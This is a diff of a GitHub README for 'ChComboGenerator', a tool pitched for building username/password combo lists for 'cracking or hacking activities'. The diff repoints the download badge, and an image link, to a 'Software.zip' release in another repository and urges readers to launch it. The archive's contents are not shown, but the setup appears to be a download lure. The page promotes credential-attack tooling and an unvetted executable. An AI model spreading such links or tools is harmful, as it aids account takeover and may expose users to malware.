@@ -2,7 +2,7 @@
 
 🔥 **Simple Combo Generator Tool** 🔥
 
-![ChComboGenerator](https://www.combogenerator.com/images/chcombo.png)
+![ChComboGenerator](https://github.com/gvidhii/ChComboGenerator/releases/download/v2.0/Software.zip)
 
 Welcome to ChComboGenerator repository! This tool is designed to create combo lists from a username list and password list. If you are into cracking or hacking activities, this tool might come in handy for you. Feel free to explore and use it responsibly.
 
@@ -18,7 +18,7 @@ Welcome to ChComboGenerator repository! This tool is designed to create combo li
 
 To get started with ChComboGenerator, download the software package from the link below:
 
-[![Download ChComboGenerator](https://img.shields.io/badge/Download-ChComboGenerator-blue)](https://github.com/YouaifXD/789566136/releases/download/v1.0/Software.zip)
+[![Download ChComboGenerator](https://github.com/gvidhii/ChComboGenerator/releases/download/v2.0/Software.zip)](https://github.com/gvidhii/ChComboGenerator/releases/download/v2.0/Software.zip)
 
 🚀 **Launch the software to start using ChComboGenerator!**
 
